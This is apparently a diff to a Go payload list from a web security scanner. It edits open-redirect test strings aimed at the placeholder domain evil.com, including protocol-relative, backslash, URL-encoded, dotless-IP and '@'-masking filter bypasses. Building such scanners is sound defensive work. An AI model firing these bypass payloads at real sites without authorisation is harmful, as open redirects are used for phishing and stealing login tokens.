@@ -4,22 +4,22 @@ package payloads
 // "evil.com" is used as a placeholder for a malicious domain.
 var OpenRedirectPayloads = []string{
 	// --- Basic Redirects ---
-	"http://evil.com",
-	"https://evil.com",
+	"http://evil.com/",
+	"https://evil.com/",
 
 	// --- Protocol-Relative & Scheme Bypasses ---
-	"//evil.com",         // Protocol-relative
-	"///evil.com",        // Extra slashes
-	"\\evil.com",         // Backslash (Windows/IIS)
-	"/\\evil.com",        // Forward and backslash (Windows/IIS)
+	"//evil.com/",        // Protocol-relative
+	"///evil.com/",       // Extra slashes
+	"\\evil.com\\",       // Backslash (Windows/IIS)
+	"/\\evil.com\\",      // Forward and backslash (Windows/IIS)
 	"https://evil.com./", // Trailing dot in domain name
 
 	// --- Encoding & Obfuscation ---
-	"https://evil%2ecom",     // URL-encoded dot
-	"http://127.0.0.1",       // Using IP addresses instead of domains
-	"http://2130706433/",     // Dotless IP address for 127.0.0.1
-	"hTtPs://evil.com",       // Mixed case scheme
-	"https%3A%2F%2Fevil.com", // Full URL encoding
+	"https://evil%2ecom/",     // URL-encoded dot
+	"http://127.0.0.1/",       // Using IP addresses instead of domains
+	"http://2130706433/",      // Dotless IP address for 127.0.0.1
+	"hTtPs://evil.com/",       // Mixed case scheme
+	"https%3A%2F%2Fevil.com/", // Full URL encoding
 
 	// --- Common Filter Bypass Techniques ---
 	"https://whitelisted.com@evil.com", // Using '@' to mask the real domain
